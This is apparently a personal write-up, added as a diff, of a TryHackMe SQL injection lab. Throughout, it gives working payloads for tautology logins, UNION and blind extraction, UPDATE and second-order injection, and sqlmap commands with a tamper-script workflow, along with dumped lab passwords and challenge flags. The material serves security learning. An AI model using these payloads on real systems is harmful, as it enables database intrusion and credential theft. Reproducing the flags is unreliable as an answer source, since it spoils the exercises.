@@ -1,0 +1,267 @@
+IP : 10.10.204.21
+Application port : 5000
+
+SQL Injection 1 : Input box non-string ->
+	1 or 1==1-- -      :  THM{dccea429d73d4a6b4f117ac64724f460}
+	
+SQL Injection 2 : Input box string ->
+	1' or 1==1-- -     :  THM{356e9de6016b9ac34e02df99a5f755ba}
+
+SQL Injection 3 : URL Injection ->
+	profileID=1' or 1==1-- -&password=a  :  THM{645eab5d34f81981f5705de54e8a9c36}
+
+SQL Injection 4 : Post Injection ->
+	profileID=1' or 1==1-- -&password=a  :  THM{727334fd0f0ea1b836a8d443f09dc8eb}
+
+SQL Injection 5 : Update Statement ->
+	Check vulnerable field : asd',nickName='test',email='hacked
+	Get Database type : 
+		# MySQL and MSSQL
+		',nickName=@@version,email='
+		# For Oracle
+		',nickName=(SELECT banner FROM v$version),email='
+		# For SQLite
+		',nickName=sqlite_version(),email='
+
+	3rd one worked so it is a sqlite database, version 3.22.0
+	
+	List all the tables : ',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
+	We found a new table secrets.
+
+	Extract all the column names from the table secrets: ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
+		CREATE TABLE secrets ( id integer primary key, author integer not null, secret text not null )
+
+	Extract the information : ',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") from secrets),email='
+
+	We found the flag : THM{b3a540515dbd9847c29cffa1bef1edfb}
+
+
+Vulnerable Startup : Broken Authentication
+	Check Vulnerability :
+                ' or 1==1-- - : THM{f35f47dcd9d596f0d3860d14cd4c68ec}
+
+Vulnerable Startup : Broken Authentication2
+	Check Vulnerability :
+		' or 1==1-- - : Logged in as admin
+	Check no. of columns : 
+		' UNION SELECT 1,2-- : Thsi will return id as 1 and username as 2
+
+	We can use that to dump the passwords.
+		' UNION SELECT 1, password from users-- : This will return ony one password from the first row.
+
+	We can use group_concat for dumping all the passwords.
+		' UNION SELECT 1,group_concat(password) FROM users-- -
+
+	We found the flag as a password : THM{fb381dfee71ef9c31b93625ad540c9fa}
+
+ 
+Vulnerable Startup : Broken Authentication3 (Blind Injection)
+	In blind sql injection we want to query for boolean results for matching each character of the password, we will increment the position at every successful guess, for this we will be using substr function of sqlite
+	Examples : 
+		-- Changing start
+		SUBSTR("THM{Blind}", 1,1) = T
+		SUBSTR("THM{Blind}", 2,1) = H
+		SUBSTR("THM{Blind}", 3,1) = M
+
+		-- Changing length
+		SUBSTR("THM{Blind}", 1,3) = THM
+
+	The LIMIT clause is used to limit the amount of data returned by the SELECT statement. The first number, 0, is the offset and the second integer is the limit:
+
+	LIMIT <OFFSET>, <LIMIT>
+
+	Below are a few examples of the LIMIT clause in action. The right table represents the user table.
+	Examples : 
+		sqlite> SELECT password FROM users LIMIT 0,1
+		THM{Blind}
+		sqlite> SELECT password FROM users LIMIT 1,1
+		Summer2019!
+		sqlite> SELECT password FROM users LIMIT 0,2
+		THM{Blind}
+		Summer2019!
+
+	The SQL query to return the first character of the admin's password can be seen here:
+
+		SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)
+
+		Now we will need a way to compare the first character of the password with our guessed value. Comparing the characters are easy, and we could do it as follows:
+
+		SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'
+
+		However, whether this approach works or not will be depending on how the application handles the inputs. The application will convert the username to lowercase for this challenge, which breaks the mentioned approach since capital T is not the same as lowercase t. The hex representation of ASCII T is 0x54 and 0x74 for lowercase t. To deal with this, we can input our character as hex representation via the substitution type X and then use SQLite's CAST expression to convert the value to the datatype the database expects.
+
+		"x,X: The argument is an integer which is displayed in hexadecimal. Lower-case hexadecimal is used for %x and upper-case is used for %X" - (sqlite.org)
+
+		This means that we can input T as X'54'. To convert the value to SQLite's Text type, we can use the CAST expression as follows: CAST(X'54' as Text). Our final query now looks as follows:
+
+		SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
+
+
+
+	Before using the query we have built, we will need to make it fit in with the original query. Our query will be placed in the username field. We can close the username parameter by adding a single quote (') and then append an AND operator to add our condition to it. Then append two dashes (--) to comment out the password check at the end of the query. With this done, our malicious query look as follows:
+
+		admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
+
+		When this is injected into the username field, the final query executed by the database will be:
+
+		SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
+
+	Also we can use the script in blind_injection directory but will have to provide password length:
+	We can guess password length by using similar query:
+		admin' AND length((SELECT password from users where username='admin'))==37-- -
+
+	But it will generate a lot of request and alomost doubles down the work first to guess the length and then to guess every character in the password.
+
+	So to reduce that we can use sqlmap to do this automatically for us.
+
+		$ sqlmap -u http://10.10.204.21:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
+
+		We foud the flag THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}
+
+		+----+---------------------------------------+----------+
+		| id | password                              | username |
+		+----+---------------------------------------+----------+
+		| 1  | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb} | admin    |
+		| 3  | asd                                   | amanda   |
+		| 2  | Summer2019!                           | dev      |
+		| 5  | 345m3io4hj3                           | emil     |
+		| 4  | viking123                             | maja     |
+		+----+---------------------------------------+----------+
+
+
+Vulnerable Startup : Vulnerable Notes
+	The notes function is not directly vulnerable, as the function to insert notes is safe because it uses parameterized queries. With parameterized queries, the SQL statement is specified first with placeholders (?) for the parameters. Then the user input is passed into each parameter of the query later. Parameterized queries allow the database to distinguish between code and data, regardless of the input.
+
+		INSERT INTO notes (username, title, note) VALUES (?, ?, ?)
+
+	Even though parameterized queries are used, the server will accept malicious data and place it in the database if the application does not sanitize it. Still, the parameterized query prevents the input from leading to SQL injection. Since the application might accept malicious data, all queries must use parameterized queries, and not only for queries directly accepting user input.
+
+	The user registration function also utilizes parameterized queries, so when the query below is executed, only the INSERT statement gets executed. It will accept any malicious input and place it in the database if it doesn't sanitize it, but the parameterized query prevents the input from leading to SQL injection.
+
+		INSERT INTO users (username, password) VALUES (?, ?)
+
+	However, the query that fetches all of the notes belonging to a user does not use parameterized queries. The username is concatenated directly into the query, making it vulnerable to SQL injection.
+
+		SELECT title, note FROM notes WHERE username = '" + username + "'
+
+	This means that if we register a user with a malicious name, everything will be fine until the user navigates to the notes page and the unsafe query tries to fetch the data for the malicious user.
+
+	By creating a user with the following name:
+	
+		' union select 1,2'
+
+	We should be able to trigger the secondary injection:
+		
+	With this username, the application performs the following query:
+
+		SELECT title, note FROM notes WHERE username = '' union select 1,2''
+
+
+	With this knowledge, this is rather easy to exploit. For example, to get all the tables from the database, we can create a user with the name:
+
+		' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''
+
+	To find the flag among the passwords, register a user with the name:
+		'  union select 1,group_concat(password) from users'
+
+	Automating the script with sqlmap:
+		It is possible to use sqlmap to automate this attack, but a standard attack with sqlmap will fail. The injection happens at the user registration, but the vulnerable function is located on the notes page. For sqlmap to exploit this vulnerability, it must do the following steps:
+			Register a malicious user
+			Login with the malicious user
+			Go to the notes page to trigger the injection
+
+		It is possible to achieve all of the necessary steps by creating a tamper script. Sqlmap supports tamper scripts, which are scripts used for tampering with injection data. With a tamper script, we can easily modify the payload, for example, adding a custom encoding to it. It also allows us to set other things, such as cookies. 
+
+		There are two custom functions in the tamper script below. The first function is create_account(), which register a user with sqlmap's payload as name and 'asd' as password. The next custom function is login(), which logs sqlmap in as the newly created user and returns the Flask session cookie. tamper() is the main function in the script, and it has the payload and **kwargs as arguments. **kwargs holds information such as the HTTP headers, which we need to place the Flask session cookie onto the request to allow sqlmap to go to the notes page to trigger the SQL injection. The tamper() function first gets the headers from kwargs, then creates a new user on the application, and then it logs in to the application and sets the Flask session onto the HTTP header object.
+		See directory tamper_script
+
+		The folder where the tamper script is located will also need an empty __init__.py  file for sqlmap to be able to load it. Before starting sqlmap with the tamper script, change the address and password variable inside the script. With this done, it is possible to exploit the vulnerability with the following command:
+
+		sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup  --data "username=admin&password=asd" 
+		--second-url http://10.10.1.134:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast
+
+		# --tamper so-tamper.py - The tamper script
+		# --url - The URL of the injection point, which is /signup in this case
+		# --data - The POST data from the registraion form to /signup. 
+		#   Password must be the same as the password in the tamper script
+		# --second-url http://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results
+		# -p username - The parameter to inject to
+		# --dbms sqlite - To speed things up
+		# --technique=U - The technique to use. [U]nion-based
+		# --no-cast - Turn off payload casting mechanism
+
+		When sqlmap asks, answer no to follow 302 redirects, then answer yes to continue further testing if it detects some WAF/IPS. Answer no when asked if you want to merge cookies in future requests, and say no to reduce the number of requests. As seen in the image below, sqlmap was able to find the vulnerability, which allows us to automate the exploitation of it.
+
+		Append -T users --dump for dumping user table.
+
+		id,password,username
+		1,rcLYWHCxeGUsA9tH3GNV,admin
+		2,asd,dev
+		3,Summer2019!,amanda
+		4,345m3io4hj3,maja
+		5,THM{4644c7e157fd5498e7e4026c89650814},xxxFLAGxxx
+		6,viking123,emil
+		7,asd,"admin(,(,().""'("
+		8,asd,"admin'uilrcs<'"">sikety"
+		9,asd,admin') order by 1-- edud
+
+		We found the flag!!
+
+
+Vulnerable Startup : Change Password ->
+
+	use admin' -- - as username and any password
+	Change the password, it will trigger the injection
+	Login to admin account with new password.
+	We got the flag : THM{cd5c4f197d708fda06979f13d8081013}
+
+Vulnerable Startup : Book Title ->
+	Get list of tables:
+		') UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -
+	We found three tables:
+		users,notes,books
+	Lets check users table:
+		') UNION SELECT 1,2,3,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users' -- -
+	We find three fields:
+		id integer primary key, username text unique not null, password text not null 
+	Lets check the password filed:
+		') UNION SELECT 1,2,3,group_concat(password) from users -- -
+	We found the passwords:
+		THM{27f8f7ce3c05ca8d6553bc5948a89210},asd,Summer2019!,345m3io4hj3,viking123,aaa
+	We found the flaf!!!
+
+Vulnerable Startup : Book Title2 ->
+	Execute the tests:
+		Limit outputs to 0 : ' union select 'STRING
+		Get first book : ' union select '1'--
+		If we did not limit the result to zero rows first, we would not have gotten the output of the UNION statement but rather the content from the LIKE clause. For example, by injecting the following string:
+			test' union select '1'--
+		Get union in second query : ' union select '1'' union select 1,2,3,4--
+		Remove the 1st id entry : ' union select '-1'' union select 1,2,3,4--
+		
+	Now we have the query structure, lets use it to get tables:
+		' union select '-1'' union select 1,2,3,group_concat(tbl_name) FROM sqlite_master WHERE type="table" and tbl_name NOT like "sqlite_%"-- -
+		Note : In above quey we need to use double quotes (") because using (') will terminate the string.
+	We found three tables:
+		users,notes,books
+	Lets check users table:
+		' union select '-1'' union select 1,2,3,sql FROM sqlite_master WHERE type!="meta" AND sql NOT NULL AND name ="users"-- -
+	We get three columns:
+		id integer primary key, username text unique not null, password text not null
+	Lets check the password column:
+		' union select '-1'' union select 1,2,3,group_concat(password) from users -- -
+	We Found the passwords:
+		THM{183526c1843c09809695a9979a672f09},asd,Summer2019!,345m3io4hj3,viking123,aaa
+	We found the flag!!!
+
+
+
+
+
+
+
+
+
+
+
+
